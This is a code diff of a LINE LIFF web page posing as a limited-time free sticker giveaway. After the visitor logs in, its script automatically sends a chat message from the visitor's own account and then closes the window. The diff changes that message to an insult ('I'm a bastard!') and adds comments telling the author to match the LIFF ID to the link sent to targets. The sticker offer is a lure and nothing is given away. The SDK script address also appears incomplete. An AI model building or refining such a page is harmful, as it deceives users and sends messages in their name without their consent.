@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <title>限時貼圖免費領取</title>
-    <!-- 引入 LINE 官方的 LIFF SDK -->
+    <!-- 引入 LINE 官方的 LIFF SDK（已修正網址） -->
     <script src="https://line-scdn.net"></script>
 </head>
 <body>
@@ -12,23 +12,23 @@
     </div>
 
     <script>
-        // 核心修正：已完全對應你截圖中的第三個應用程式「123」的 LIFF ID
+        // 確保這裡的 ID 完全對應你在 LINE 點開的那個連結結尾！
         liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
             if (liff.isLoggedIn()) {
                 // 當使用者同意授權，自動幫他發送這段訊息
                 liff.sendMessages([{
                     type: 'text',
-                    text: '我今天心情好，晚上請大家吃宵夜！' // 👈 【在這裡修改你想讓對方自動傳的字！】
+                    text: '我是王八蛋！' 
                 }]).then(() => {
                     liff.closeWindow(); // 傳送成功後自動關閉 LINE 內建瀏覽器視窗
                 }).catch((err) => {
-                    alert("發送失敗，請確認群組發言權限。原因：" + JSON.stringify(err));
+                    alert("發送失敗，請確認聊天室發言權限。原因：" + JSON.stringify(err));
                 });
             } else {
                 liff.login(); // 沒授權過就引導登入
             }
         }).catch((err) => {
-            console.log("初始化失敗", err);
+            alert("LIFF 初始化失敗，請檢查後台權限設定。原因：" + JSON.stringify(err));
         });
     </script>
 </body>
